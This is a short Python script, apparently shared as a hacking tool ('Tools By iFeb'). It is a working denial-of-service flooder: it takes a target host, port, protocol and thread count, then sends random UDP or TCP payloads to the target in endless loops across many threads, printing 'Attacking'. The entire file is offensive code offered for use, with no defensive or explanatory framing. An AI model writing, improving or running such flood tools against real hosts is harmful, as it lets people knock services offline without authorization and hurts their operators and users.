import random
import socket
import threading

print ("Tools By iFeb")
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" UDP/TCP:"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("Attacking ")
		except:
			print("Attacking ")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("Attacking ")
		except:
			s.close()
			print("Attacking ")

for y in range(threads):
	if choice == 'UDP':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
